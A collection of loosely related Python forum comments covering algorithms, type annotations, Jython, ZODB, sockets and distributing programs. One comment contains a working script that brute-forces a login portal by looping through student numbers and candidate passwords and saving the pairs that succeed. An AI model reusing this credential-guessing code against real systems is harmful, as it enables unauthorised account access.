Here is some easy code. For longer sequences, the standard is the Karmarkar-Karp algorithm; it's longer (about 100 lines) but amazing. https://mail.python.org/pipermail/tutor/2001-August/008098.html """ Partition Problem, ok for small sequences """ # =========================================================================== def greedyPartition(S, X=None): A, B = [], [] if X == None: T = S else: T = [] for sx,sv in enumerate(S): if sx in X: A.append(sv) else: T.append(sv) T.sort() for t in T: if sum(A) &lt;= sum(B): A.append(t) else: B.append(t) diff = abs(sum(A) - sum(B)) return diff, A, B # --------------------------------------------------------------------------- def greedierPartition(S): """ Create starter of all pairs from S, there are sz*(sz-1)/2 cases, pick the best one. """ sz = len(S) minDiff = 99999999999 minA = None minB = None for x in range(0,sz-1): for y in range(x+1,sz): d,a,b = greedyPartition(S, X=(x,y)) if d == 0: return d,a,b if d &lt; minDiff: minDiff = d minA = a minB = b return minDiff, minA, minB # =========================================================================== if __name__ == "__main__": caseList = [ [5, 5, 4, 3, 3], [4, 5, 6, 7, 8], [3, 1, 1, 2, 2, 1], [3, 6, 13, 20, 30, 40, 73], ] for testCase in caseList: diff, a, b = greedierPartition(testCase) print 'Sequence: {}'.format(testCase) print ' diff {}: {}'.format(diff, (a,b)) Output Sequence: [5, 5, 4, 3, 3] diff 0: ([5, 5], [3, 3, 4]) Sequence: [4, 5, 6, 7, 8] diff 0: ([7, 8], [4, 5, 6]) Sequence: [3, 1, 1, 2, 2, 1] diff 0: ([3, 2], [1, 1, 1, 2]) Sequence: [3, 6, 13, 20, 30, 40, 73] diff 1: ([20, 73], [3, 6, 13, 30, 40])
One of the other 3rd-party libraries is Obiwan -- [Github](https://github.com/williame/obiwan) and [pypi](https://pypi.python.org/pypi/obiwan/1.0.2). The author claims its syntax is nicer than that of mypy. It appears to me that all of these proposals do nothing except to standardize a syntax for a method of commenting functions. That's all these things are, highly-formalized commentary. The interpreter ignores them completely, there is no verification of the declared types either at compile time or execution time. The benefit of this seems very mild to me.
&gt;Many of these developers do not really have a good understanding of how &gt;everything works. It is "magic" to them. I spent a lot of time in the world of Delphi. I assure you, having a GUI tool does *not* equate to "have no idea how to program". These are people who, when they got into arguments, would regularly dump assembly code and begin debating about the relative merits of particular machine code instructions. Honestly, over the last two years I've observed that the Delphi blogs are much more technical than the average Python blog. 
This only tries to say if there is a partition. [1, 1, 2, 2, 3, 1] gives False, but is [1,1,2,1] + [2,3] 
String interning is a good trick if you have repeated data, but OF COURSE calling fetchall() is going to use more memory than an iterator. That's what iterators are for. 
I guess I misunderstood the problem -- I figured the two sub lists had to be contiguous. Not the worst way to was 2-3 minutes :P
It's about god damn time. They've been talking about this forever.
Every library I've seen for this either sucks or is terribly clunky. Supporting it directly in the syntax should hopefully make it faster and more elegant to use.
You make it sound like nothing gets verified even when you use a library for that purpose. What I see so far: * mypy is designed for static analysis of the annotations. The original intent was to run at compile time, but they seem to have decided pretty recently it's better to run during development, like pyflakes. They're shifting its focus to encourage this way of using it. * obiwan really does check the values at runtime. It's easier to set up than mypy if you want to use a type-checker *right now*. obiwan clearly slows down the interpreter, so it's something you probably only want to run when testing or debugging.
Yes. Why not? You're just making one big string. Big strings are often where you need the format method. raise ValueError( "This is a rather verbose error message telling you about the " "fact that {0!r} can't be frobnicated with {1!r}. Did you mean " "{2!r} instead of {0!r}?".format(arg1, arg2, suggestion) ) 
Hey Folks, We were performing a major network equipment upgrade over the weekend which required us to take down our internal network and, unexpectedly, parts of SciPy.org. The result has been an unexpected and lengthy outage on important parts of the SciPy website. While several of the services for SciPy have been moved to external hosting, a few sub-domains including docs, wiki, and email lists remain on older servers. We are currently all-hands-on-deck trying to rectify the problem. As soon as we have have an ETA, we will update this message. Our hope is we will have it solved in the next 24 hours. Apologies for the inconvenience this has caused. Obviously, once things are back up and running, we will review the services and how to prevent this from happening again. Thanks, Enthought
Use with io.open("file", "w", encoding=" utf8") as fp: fp.write("test") This closes the file automatically, even if there's is an error.
 reapbian on a raspberry pi , , , this is the whole code : #!/usr/bin/python import httplib,urllib2,hashlib print_or_not = 0 def md5(mate): m = hashlib.md5() m.update(mate) return m.hexdigest() def prepare(): hc = httplib.HTTPConnection(host = '10.0.0.55') return hc def main(): username_file = open('studentnumber.txt','r') password_file = open('password.txt','r') gotit = open('gotit.txt','a') username = username_file.readline() password = password_file.readline() while username != '': password_file.seek(0) password = password_file.readline() while password != '': username = username.strip('\r\n') password = password.strip('\r\n') if print_or_not: print 'username:password:',username,password hc = prepare() password1 = md5(password) password2 = password1[8:24] data = "username="+username+"&amp;password="+password2+"&amp;drop="+"0"+"&amp;type=1&amp;n=100" headers = {"Content-type":"application/x-www-form-urlencoded", 'connection':'keep-alive', "Accept":"text/plain"} try: hc.request(method = 'POST',url = '/cgi-bin/do_login',body = data,headers = headers) response = hc.getresponse() except httplib.BadStatusLine: print 'badstatusline error:(username:password)',username,':',password break result = response.read() if print_or_not: print response.status,response.reason,result if result == 'username_error': break if result != 'password_error': temp = 'username:password:' + username + password + '\r\n' gotit.write(temp) gotit.close() gotit = open('gotit.txt','a') break if print_or_not: print '' password = password_file.readline() hc.close() username = username_file.readline() if __name__ == '__main__': main() 
sorry , copy and paste seems fucked...
em... i got this error: Traceback (most recent call last): File "./test.py", line 8, in &lt;module&gt; fp.write("good") TypeError: must be unicode, not str i googled and solved it:u("good") thank you!!! 
Also, if you're using Python 3, cx_Freeze is IIRC the only one that supports that.
This has to do with "buffered io". Basically your OS doesn't actually commit (usually called "flushing") the write to the file until a certain amount of data has accumulated. This means that if you read the data is committed, the file will appear empty. When you close a file descriptor in python, it flushes the data behind the scenes. You can do this without closing the file by using the flush() method. Here are a couple pages explaining this better: http://stackoverflow.com/questions/1450551/buffered-i-o-vs-unbuffered-io http://stackoverflow.com/questions/7127075/what-exactly-the-pythons-file-flush-is-doing
You need to indent your entire code block with 4 spaces for it to show up as code
&gt; Now we have this issue and Guido wants to make it a language feature? We already have many fine libraries that could do this. But according to the Python creators, no one works well. &gt; Mandating a syntax is going to break things like PyContracts. Hum... No. [PyContracts already supports Python 3 function annotations quite well](http://andreacensi.github.io/contracts/). &gt; Annotations were supposed to be left alone to let the community come up with uses and they have. Why the rush to shove all that aside? That's explained in [PEP 3107's rationale](http://legacy.python.org/dev/peps/pep-3107/#rationale). It aims to reduce the confusion caused by multiple non-standard variations of the same thing. &gt; On another note the very existence/success of Python would suggest that type checking isn't a major issue; Success doesn't mean it's flawless or perfect, and the existence of various contract/type checking libraries proves that there is plenty of demand for this feature.
I still don't get why I would need one. The example and description given seem like a way to hide the functionality and clarity of a while loop behind a layer that you don't really need.
You dont need the parenthesis. u"test"
Never thought about using it this way, thanks.
python isn't a good choice is this task; it is primarily a scripting language, and not suitable for distributing applications with a bundled copy of the runtime. pyinstaller, cx_freeze and pyexe are various attempts to bundle in this way, and they work *relatively* well, but specific packages may or may not work with each of them. A much better solution would be to use a language that targets static binary distribution like go, or are easier to bundle like node with node-webkit or atom-shell. (this isn't a particularly unique issue with python; ruby and node scripts have the same issues; the node runtime is just easier to embed) 
That's a very fragile approach.
Hell, "the g-man" would suffice. I like to think we are bros.
Most likely missing closing parenthesis on the previous line (comment lines don't count).
._. can't believe I've missed that I had 1... but I needed 2 thanks a lot 
This is the first blogpost in a series on Python programming for investigative journalists. I was planning to write about this subject for several years. Inspired by the project [Bellingcat](https://bellingcat.com), a news source by and for citizen investigative journalists, I started writing a couple of weeks ago. There are four posts available now, starting with the basics and moving to more difficult subjects like object oriented programming. I tried to write without using jargon terms and explaining every it every time I did. I will be working towards more advanced subjects in the future, like GUI programming, analyzing videos using OpenCV to detect moving objects and generating extensive reports with Reportlab. 
Very interesting, and in line with the popular "python as practical means to an end" style videos posted a couple days back (there was one for horse betting and one for bus route data hacking). I'll be back with feedback once I read through it.
Just try to use beautifulsoup4 https://pypi.python.org/pypi/beautifulsoup4/4.3.2
I do investigative work every now and again and use Python almost exclusively for screen scraping and looking up stuff on APIs. I'm going to follow this.
Still looks like magic, no?
Thanks ePierre!
Thanks eshtrel!
If you by magic mean operator overloading, then yes :). When you annotate functions with `@curry` they become members of the Reader class, which has overloaded the `*` operator to mean function composition.
Pretty handwavy article. 1. Yes, the JVM is fast. There is no indication that Jython is fast. Benchmarks I have seen in the past shows that Jython loses to PyPy in performance. 2. Java libraries are nice. You know what's nice as well? Python libraries. You know what's an excellent date library? [Arrow](http://crsmithdev.com/arrow/). I'm not familiar with the NLTK library, but is there any indication that the example stated *requires* Jython? The [docs](http://www.nltk.org/api/nltk.tag.html#module-nltk.tag.stanford) does not indicate that. You lose a whole bunch of benefits using Jython. Python 3 (yes, that's a benefit to some people), libraries that rely on C extensions just to name a few.
Yeah. It's an approach though. Having long-running processes aborted when everything ends fine is better than never having them aborted.
I just don't see Jython's popularity increasing anytime soon. Many people turn to Python as an alternative to the Java ecosystem. I work at a Java shop, it's a breath of fresh air for me when I get to work in Python. At this point, the only contender for dethroning CPython as the interpreter of choice is pypy. That being said, I do see Java as a better choice than Python for some use cases. Unfortunately. :)
That's completely different.
And worse than both of those is "maybe having them aborted, maybe not". When you reach the point where you need to send an Ajax request when the user closes their browser window is the time you sit down and re-think your system.
All three parts are up, and it was a pretty good read.
Old-style classes! Barf!
Thank you. I assumed the next article had nothing to do with the first.
Unless he's using Python 3, right? Sigh. If there were something I would change about Python 3 is enforcement of new-style class declarations. In any case, if I'm not mistaken when it comes to the difference between old-style and new-style in 2.7, one of the biggies is MRO. :P
- First, you might find more information if you look at using Postgresql rather than MySQL. From what I've observed it's more popular with the Python crowd, and has several good choices for bindings. - Second, are you writing SQL queries or looking to use an ORM? If the former, you'll want to look into learning Python's DB-API, which is a standard API that db bindings are supposed to implement. Once you learn that, it's roughly the same for any RDBMS. If you want to go ORM, then SQLAlchemy is usually a good place to start.
You're right that it's not clear at the bottom of our posts that the links take you to the next post in the series. I'll see if I can make that clearer.
You're correct: this is all using Python 3. I'll update the posts to make that clear.
Technically it applies to new-style classes, so it's relevant to Python 2.2+.
Python 3, actually.
That's a fair assumption, but your example is flawed (and proves my point that this kind of thing can almost always be avoided by proper design). Your service transcodes video from one format to another, and the user then downloads. This implies the user first uploads a file, which is stored somewhere. Now the whole point of this is the user wants the transcoded video, so cancelling the process half way through if he closes the browser would infact waste cycles, because when the user comes back and re-submits the video for transcoding you have to start again. A better design would be to continue with the transcoding and store it somewhere associated with the file. That way when the user returns to the site and re-uploads the video the system can simply grab the transcoded version and serve it instantly, or give them up-to-date progress on the transcoding. Better yet the file is linked to the users session cookie so they don't even need to re-submit it.
No. Stop living in the "multiple class-styles" past. Python only has and only needs new-style classes. Python 3 abandoning the need to specify the object inheritance is a good thing.
(disclaimer: I'm the author of the post) 1. Yup. I don't know if Jython in particular is fast. I DO know that Java and Scala bytecode can be incredibly fast. 2. One of NLTK's NERTagger classes uses the Stanford Tagger which is written in Java. NERTagger runs the java code and captures the standard output. The article is all about choice. I don't think Jython is going to replace Python but there are a few use cases on which it can be useful. Interacting with a third-party library written in Java is one of those cases.
So how do people distribute programs made with python? 
I work with manufacturing software that uses jython for the scripting (events, monitoring, etc.) and it's cool but honestly I almost always look for the python way of doing things instead of invoking java libraries. 
You won't need any tutorials, if you can write C#, you understand oop principles which means you'll be fine. Syntax is just that, syntax, the patterns/principles are the same. Just install python and some IDE (I think you can use VS) and take an easy part of your app and rewrite it. It wont take you long after that at all. Don't waste your time with tutorials IMO.
It's been many years since I've worked on a GUI in Java, but in my experience it consisted of massive amounts of auto-generated cruft code. My work with Python GUIs has been a dream in comparison.
That sounds like Netbeans (the auto-generated), yeah that was serious shit. Just for shits and giggles what GUI framework are you using in Python? wx? 
Eclipse, actually. Qt and Gtk, primarily. I've used others, but Qt is my preference.
Learning the basics can take anywhere between a week-end and a month depending on how committed and quick to learn you are. After that, mastering programming is pretty much a never ending task, since you can always get better. However, if your goal is to be "marketable" in a few years, it is definitely doable. Taking part in the development of collaborative software and/or writing scripts for your everyday needs can only speed up the process.
The following will give you list of the table's names. I know this works with Intersystem Cache Database over an ODBC connection. I not sure if all databases support it over ODBC. You can give it a try. def getTables(): conn = pyodbc.connect(cnxnString) cur = conn.cursor() tbls = [x[2] for x in cur.tables()] cur.close() conn.close() return tbls 
Well Python's predecessor was originally designed for the purpose of teaching computer programming. Among languages that are actually useful, it's probably the easiest. How quickly you pick it up probably depends on your aptitude for it. For some people, programming just clicks, for others not.
Now have fun trying to apply these best practices in Python 2 where much of the standard libs use old-style classes! So done with Python 2 after my current project.
Even if you don't directly use Python, learning a programming language definitely changes the way you think about problems
No no. That's C
&gt; Having trouble What kind of trouble? &gt; syncing data between sockets What does that mean? What are you trying to do? What kind of sockets are you using? Why don't you: - open a connection - send the data - close the connection ?
Yea, the example wasn't the point. It was an example of a long-running process that doesn't have any lasting side effects. I'm not really interested in going through the exercise of finding one that stands up to other design considerations. Generating a report from a large amount of instantaneous data? Whatever.
Beyond looking at the frequency profiles of a few positive words and a few curse words, you might consider doing some more serious sentiment analysis.
Except that there are lots of people who have Python 2.7 as the default. Or are learning Python on the jobs that use Python 2.7. Does that mean in the name of Python 3 it's okay to screw them by teaching them bad Python 2.7 habits. Look, you know I'm a Python 3 fan, have used it quite a bit professionally, but this is silly.
You're right ... I work in a java/net shop ;-) and i'm a big python lover ;-) So i use jython/IronPython everyday ! I like the JVM more than the CLR, coz I'm linux boy. You should take a look at pyjnius, it's another way to call java class, but from cpython ... It talks to the JVM via jni. It's a great thing ! So you can use the best of each worlds
You may want to have a selectable endianness. 
They don't.
 import re re.sub(r'%..', '="//', '&lt;a href="%20learntocodewith.me" target="_blank"&gt;Learn to Code With Me&lt;/a&gt;')
No. The zero-arg `super()` only works under Python 3 as well. 
Python doesn't run in interactive mode unless stdin is a terminal. Expressions are auto-printed only in interactive mode. You can force python into interactive mode with the `-i` option: $ echo "(50 - 5*6) / 4" | python -i Python 2.7.6 (default, Apr 9 2014, 11:48:52) [GCC 4.2.1 Compatible Apple LLVM 5.1 (clang-503.0.38)] on darwin Type "help", "copyright", "credits" or "license" for more information. &gt;&gt;&gt; 5 &gt;&gt;&gt; $
The second statement doesn't work because you're not piping to the REPL. echo "(50 - 5*6) / 4" | python3 is basically equivalent to echo "(50 - 5*6) / 4" &gt; math.py python3 math.py (Not *actually* equivalent - that's just a way to imagine what's happening.) In a python script, just putting `(50 - 5*6) / 4` on a line by itself won't do anything; Python will do the math and then discard it. With the `print()` statement, Python actually has something to do with the value it just produced.
I'm using a tcp socket. The data that i need to send may overflow the buffer, in which case i need to break the data up in pieces and send them sequentially. When i'm using a loop to do this, i need to know if the application on the other side of the connection is ready to receive the next piece. Otherwise the buffer on that side will overflow.
Aha! This makes sense. Thank you.
&gt; may overflow the buffer May overflow or does overflow? It should be handled for you.
&gt; One of NLTK's NERTagger classes uses the Stanford Tagger which is written in Java. NERTagger runs the java code and captures the standard output. &gt; So why is Jython required at all? 
I'm not a journalist but that tweepy module looks pretty awesome. Going to have some fun with that.
check out coursera and udacity- both have some solid intro courses for computing based in python. Also the sidebar. Python is a favorite in a lot of places because of its readability, some people hate it because of the whitespacing rules. I'd also recommend looking at some of the data analysis and algorithm courses offered at places like udacity, since they will be widely applicable. The Anaconda distribution of Python is geared toward scientific uses, which might be what you are looking for.
Nice article.
I understand why they did it, but a large part of me wishes they hadn't. Python 2.x should die already.
May god have mercy on your soul, kingkilr!
Matches C, C++, C#, Objective-c, Cg...
May overflow. I grab data from a database, serialize it and send it off. If a whole table is requested then it won't fit. a single row will though.
2.7 is far too pervasive to die any time soon.
So basically, if you have a shitty teacher, don't learn Java? The truth is, learning either is a great starting point.
&gt; it won't fit It won't fit where exactly? My crystal ball tells me that perhaps you should keep calling `recv()`?
Wow why did you need to create so many wx apps?
I know that. That's why I said I understand why they did it.
Can somebody explain to me what we're arguing about?
Dropbox desktop client is written with python.
[Here](http://lmgtfy.com/?q=python+function+definition+syntax) is a great link for what you're looking for: 
&gt; PyJNIus is a "Work In Progress". I'll have to stick with Jython for now. 
I'm rather fond of Flask-MongoEngine. It provides a very usable abstraction on top of MongoEngine without feeling bloated. My only problem is that I'm not overly enamored with the way MongoEngine handles wiring the database. Ming is vastly superior in that regard, particularly if you like the way one queries Mongo in the JS shell. Ming's documentation is horrendous, however. This makes trying to find out how to do anything nontrivial an exercise in frustration and source exploration. 
https://wiki.python.org/moin/NewClassVsClassicClass
em ... my fault it's u"good" thx
Why? Have been using it for a long time and seems to work very well.
Fair enough, but the core principle of MRO and how super() uses it are the same, and that's the main point I wanted to communicate. 
Because Python 3 is the future. Perpetually fixing Python 2.x will slow down adaptation of Python 3.
It's not a zero-sum game.
Typically you'd pass around a package to someone who already has the runtime installed. https://store.continuum.io/cshop/anaconda/ is quite a popular choice it seems, esp' for science related stuff, as it's quite easy to install. ...but basically, people don't. They put packages on pypy and people and install them from their local python installation when/if they need them; that's why although python is a very popular language, you very seldom see desktop applications written in it (those that do, like calibre, use one of the bundlers above, or like maya and blender, embed a copy of the python runtime inside a C++ application).
It's definitely fun to use, once you understand it. Bug tracker and source code: https://bugs.launchpad.net/zodb Best IRC channel is probably #zope (freenode) Mailing list is weird. I think it moved to google groups here: https://groups.google.com/forum/#!forum/zodb. But I think there's also another one that's still active on zope.org. I'm not sure, maybe you can post there and ask.
So we have a relatively active mailing list. I have not tried the IRC channel yet., Thanks for the reply. 
It's great. Been running on it for the past 8 no 10 years on it without a single problem or bug encountered. It is very stable, rock solid. Do not hesitate to use it. Zope may be dead but zodb lives on.
For Python &lt; 2.7.9: https://pypi.python.org/pypi/backports.ssl_match_hostname
This covers only a small portion of the stuff we backported.
Absolutely not. It's very difficult to debug with and isn't anywhere near as scalable as a proper SQL database. Save yourself a lot of headache and avoid ZODB like the plague.
Awesome, good sir! This is not only for investigative journalism! There are great use cases for tweepy. Ty
True, not fixing it will increase adoption, but not necessarily of py3, most likely of go or node js Also I empirically determined that customers do not care what the future of python is, they seem to care is software is broken or has security holes in it 
but it works (at least on *nix/win ... and ios for sure (but not tested this)) 
Hey, at least they really want to use print as a function https://github.com/zopefoundation/ZODB/blob/master/src/ZODB/FileStorage/fsdump.py#L1-L24
In my opinion, stay away from wx. I have been involved with sizeable project with wx and I would even dream calling it cross-platform -- there's so much code just to make sure components work the same in all three OSes. Another thing is that versions of wx are also incompatible to each other (I remember even between minor versions but could be wrong). And then the fact that there seems to not be any major version that works across all three OSes
I only used it with Zope. I coded Zope2/zope projects for 2-3 years, some with 2-4Gb databases. It's a single file based database unless you tweak your application to have different mount points. Write conflicts are still poorly managed when you have a large number of concurrent writes in the same path. Search for "ConflictError: database conflict error". Look how difficult debugging/inspecting bad data is: - http://www.mesimian.com/path-of-lost-file-zodb-blobstorage/ - http://www.mesimian.com/test-object-from-zodb-is-broken-in-zope/ You will start to rely on Persistence classes. Every data migration will become a pain. You will have to use ZCatalog for indexing or even iterating objects - undocumented and unusable without obscure PluginIndex-es for each data type. You will have to use Zope DateTime objects because there's an index plugin for that. Oh the joy of juggling with data types like we're coding in Java. So you will drag yourself along in a world of poorly documented and narrowly spread technologies when there are so many better tools out there, be it sql or nosql.
Also I am not sure if there are anything like ZODB for Python or other programming languages. I would really like to hear if there are other projects based on the same principles. 
Is there an API reference somewhere?
yes there are lots of object databases around.
Any sources ? I am using ZODB for 4 years now and debugging never had been a problem. For scalability, ZRS does the job : https://pypi.python.org/pypi/zc.zrs/2.4.4
Exactly. For the same reason I also left out D.
how do you tame a horse though?
&gt; &gt; PyJNIus is a "Work In Progress". &gt; I'll have to stick with Jython for now. This line doesn't necessarily mean it doesn't work, or that it's unstable where it does - actually, it probably largely reflects that the pyjnius user/developer base is small and mostly driven by kivy's need to communicate with android apis from cpython (which works extremely well). On the coding side there are still more things we'd like to implement, but it should be totally usable. Going by the article and some of the comments here, the project could be much more widely useful...if anyone would like to use java classes from cpython, please don't be afraid to try it and let us know what you think!
It's best to read the documentation of the functions you are using. os.listdir lists all the contents of a specific directory. glob.glob lists paths matching a wildcard pattern. glob.glob("/home/seb/learning/*.txt")
https://www.youtube.com/watch?v=OSGv2VnC0go
There are lots of ORMs around. Django and SQLAlchemy are the big ones for Python.
Well, no. In your original post, you have "/home/seb/learning/.txt". That is not a wildcard pattern. Notice the lack of *.
One remark - you are probably better off with SQLite as a database, since your program sounds rather simple. With SQLite, the database is just a single file that you can easily copy to and from the Raspberries, and it doesn't require any other running service, just your own program.
Yeah, it's the windows 8 effect: if I have to learn something new either way why does it have to be your new thing?
https://docs.python.org/2/library/functions.html#enumerate Always check the docs and this should have posted to /r/learnpython
I learned in C++. We spent at least a third of our time trying to get the damn gizmos to compile. Would have loved a REPL to try ideas out and figure out my control structures.
&gt; That said, this task is a much better fit for AutoHotkey. Not if I want to deploy it to 200 machines and have it used by up to 800 users. With a MySQL backend and potential for cross platform ;) Will look at pyHook though.
Have you not considered using sqlite?
Work out what my tag does and why it's useful
Calculate primes in a single line of python code, quickly. Here's what I came up with a while back, and I haven't found anything faster yet... http://www.technobabelfish.com/2014/06/single-line-prime-numbers-in-python.html
til: orm = object database, and django is an orm. 
I believe it is good to start programming in functional languagues (e.g. Haskell). They are quite easy to pick up for people with no programming experience and they teach you some good practices (like keep things immutable if possible). For example Cambridge University uses ML as an introductory programming language. I also believe later you should learn declarative programming languages like Python, Java or C/C++, as developing in functional languages is often impractical for real life projects.
&gt; how to best check the number of lines in a file? You need to `open()` the file and count the lines. Something like this: len([line for line in open(filename)]) &gt; EDIT: when I try to use os.listdir I receive the following error message: &gt; for file in os.listdir("/home/seb/learning/.txt"): OSError: [Errno 2] No such file or directory: '/home/seb/learning/.txt' You forgot the * which matches all characters. Your code looks for a file specifically named ".txt" which doesn't exist.
Are you on Windows or Linux? Windows doesn't care about the case in file/directory names, while Linux does.
I think ZODB would be a much simpler option to either CouchDB or MongoDB. It's just a library that you use, without having to run another server* or learn another language/paradigm. * you can put it on another server if needed, but that's optional
&gt; Just curious, do you have an opinion about JPype? Not really, I haven't heard about it before. I'm no expert about pyjnius either (my own uses are fairly trivial), but I didn't want the 'work in progress' thing to misrepresent it - I know there are parts of other kivy projects that are conservatively labelled as unstable or experimental when in practice they're fine. Edit: I asked some of the devs about this and someone remembered https://groups.google.com/forum/#!topic/kivy-users/omjWqA0en4s - an original mailing list post about pyjnius with a note about jpype apparently not being known about at the time (I think some of the technical limitations stated about pyjnius are no longer the case though). Looking around, it seems there are some technical differences, but probably largely similar capabilities. &gt; Is there a PyJNIus equivalent to the following Jython code? I'm not sure about this - I haven't seen it done, but I haven't delved into it much either. If you're interested, kivy's support channels are probably the place to ask - pyjnius doesn't depend on kivy or anything, but the developers are largely the same and pyjnius doesn't have its own mailing lists etc.
This question would fit more into [/r/datascience/](http://www.reddit.com/r/datascience/) or [/r/MachineLearning/](http://www.reddit.com/r/MachineLearning/) than /r/Python. I think there are some points to consider: * What accuracy or recall is needed? Maybe it all you need is a minimal set of regular expressions to match 90% of your data. If its not the case, you would have to look into more complex machine learning strategies. I think Conditional Random Fields is one good way to start, because they incorporate things like name comes before address. [ParsCit](http://aye.comp.nus.edu.sg/parsCit/) does something similar, but with citation references. Then parses them into author(s), title, affiliation and so on. * What amount of time can you spend? If its "just" some data cleaning and the formats don't change that much (well if not you are pretty much lost) I'd still go with some bigger set of regex and get the work done in a day. * What's your goal? If will go into something like matching different entries in databases then you could directly dive into *entity matching/resolution* or *data deduplication*. There is some promising looking tool called [dedupe](https://github.com/datamade/dedupe) But it all depends on what you want to achieve.
Have a look at best rated solutions at checkio.org. It is a real gold mine of poetic one-liners. PS: You know lambdas are discouraged in favour of list comprehensions?
Why post those questions without the solutions? 
For parsing websites, I've used [BeautifulSoup](http://en.wikipedia.org/wiki/Beautiful_Soup) before with great success (there may be a better library by now, but that was the best a few years ago). If you are looking to write SQL statements directly, most database drivers implement the [DB API](http://legacy.python.org/dev/peps/pep-0249/) but [SQLAlchemy](http://www.sqlalchemy.org/) is a really nice ORM.
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Beautiful Soup**](https://en.wikipedia.org/wiki/Beautiful%20Soup): [](#sfw) --- &gt; &gt;__Beautiful Soup__ is a [Python](https://en.wikipedia.org/wiki/Python_(programming_language\)) library for parsing [HTML](https://en.wikipedia.org/wiki/HTML) documents (including having malformed markup, i.e. non-closed tags, so named after [Tag soup](https://en.wikipedia.org/wiki/Tag_soup)). It creates a parse tree for parsed pages that can be used to extract data from HTML, so this library is useful for [web scraping](https://en.wikipedia.org/wiki/Web_scraping) — extracting data from websites. &gt;It is available for Python 2.6+ and Python 3. &gt; --- ^Interesting: [^Soup ^\(The ^Housemartins ^and ^The ^Beautiful ^South ^album)](https://en.wikipedia.org/wiki/Soup_\(The_Housemartins_and_The_Beautiful_South_album\)) ^| [^Comparison ^of ^HTML ^parsers](https://en.wikipedia.org/wiki/Comparison_of_HTML_parsers) ^| [^John ^Wray ^\(novelist)](https://en.wikipedia.org/wiki/John_Wray_\(novelist\)) ^| [^Alice's ^Adventures ^in ^Wonderland](https://en.wikipedia.org/wiki/Alice%27s_Adventures_in_Wonderland) ^Parent ^commenter ^can [^toggle ^NSFW](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cjwh44h) ^or[](#or) [^delete](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cjwh44h)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
It sounds like you're trying to build TCP on top of TCP, which has synchronization built into it. The flags you refer to all come from the TCP spec. It would be helpful to post a sample of your code if you want a better idea of what you might be doing wrong.
Just first-hand experience. Granted, I'm speaking for my own requirements. I work with a lot of large-datasets, so I'll routinely have tables with millions of records, each record with possibly a hundred columns or more. I need to be able to: 1. ensure that every field in ever record conforms to a specific schema with explicit data types 2. be able to open a query tool and select/inspect any number of records 3. be able to easily define schema changes and confirm that all records have been updated ZODB does none of these well. For #1, you're trusting that your application layer to validate all your Python objects, and history tells me this will lead to bad ends. If I tell a SQL db that a field must be an integer, I can be 100% sure that that field will always contain an integer. For #2, there are some query and inspection tools for ZODB, but they're pretty limited compared to traditional SQL editors. For #3, I never found any good solution with ZODB, short of versioning your instances and updating them once retrieved, or interating over all of them with some custom script. Compare this to tools like South with Django, that handle this remarkably well. Other concerns are storage size efficiency. Most SQL databases can store certain datatypes very efficiently. Postgres doesn't even take up space for null values, essentially making it a sparse model. Whereas in ZODB, the equivalent data will take up much more space because entire Python instances are being serialized. It's been a few years since I last evaluated ZODB, so maybe these have changed, but given ZODB's nature, I expect they probably haven't. My casual view of ZODB is that someone saw Pickle and thought, "Hmm, let's make that a database." If you're content with a more robust form of Pickle, it should be fine, but if you want tools and features common to most modern databases, ZODB isn't going to cut it.
I prototyped the core of a PIM (product information management) application with ZODB which took me three weeks, no way I could have done this with an ORM in the same time. The code was beautiful and it ran circles around the Java-PIM-horror I was trying to replace. But all the time it felt as if there was a mountain over my head, ready to collapse the moment I had to change something on the underlying structure of the whole thing. 
Just what the gaming world needs right now... another minecraft/survival clone.
I thought you couldn't see the solutions until you finish the challenge yourself?
Not retarded. I have gotten syntax errors a zillion times when I forgot the colon at the end, lol. def foo() print 'Something really important' foo() ERROR: no way Jose!@ 
I think you couldn't be more wrong. Python allowed me to focus on algorithms and clean architecture. After a while, I started to miss static types for additional safety. That is what drew me to other languages. Because of Python, I always focus on clean code and clean architecture. Much better than always worrying about what types to use and never focusing on the good architecture and design. 
There's a lot of value in doing things people have already done. The creator can learn a lot and maybe even have some ideas no one else has had yet.
I like it! I'm a sucker for list comprehension though. sum([1 for line in open(filename)])
functools.lru_cache does this already though.
For points 1, 2 and 3 sounds like none of those are sweetspodt of ZODB and you were using the wrong tool for the job. 
The problem with the above is that by adding the brackets, you could potentially have a hundreds of thousands long list of ones. This needlessly takes up memory. Without the brackets, it does exactly the same thing but instead of storing that giant list, it looks at a one, adds it, then discards it. You never need to store this one in memory, so you don't. I'd suggest looking into generators in python, they are awesome. Also, with this logic it never closes the opened file. 
TIL.
Any advice for a beginner ultimately wanting to create something like this? How long do you think it would take to get to this level? I'm about halfway through the tutorial on codeacademy and I plan to finish that first but what about after?
Autovivification is pretty cool: from collections import defaultdict def tree(): return defaultdict(tree) EDIT: @hharison you are right, was on my phone so couldn't check it.
I'll have to say my favorite is still: &gt;&gt;&gt; {1:0,True:1}[1] 1
I would start with Learn Python the Hard Way over Code Academy. After that, though, you still have a long way to go. 
&gt; functools.lru_cache Holy crap that is cool.
I prefer a closure for this.
I think more advanced students should learn useful libraries, like sqlalchemy and requests.
That's a distinction without a difference. 
In the buffer. Let's assume that the buffer is 2 bytes for this example, if is send 'Hello World.', then the data must be sent in parts: ['He', 'll', 'o ', 'Wo', 'rl', 'd.']. The only thing i want is to receive all these parts, in order, and be able to glue them back together.
Try finding a project on github you think is cool and see if you can contribute. Even documentation fixes are greatly appreciated
I think at some point a person needs to have experience with all the major paradigms to be a truly good programmer. I personally learned to program mostly with Java, and I think the rigid structure and compulsory OOP was beneficial, especially when planning out large projects.
I don't know how my large my data set is going to get.For now that is not a concern. As you mentioned about south for Django, in case of ZODB do we have to even maintain versions of data file ? or how does it work when i change the underlying object structure? I have not used ZODB so i might have asked something very obvious or silly. 
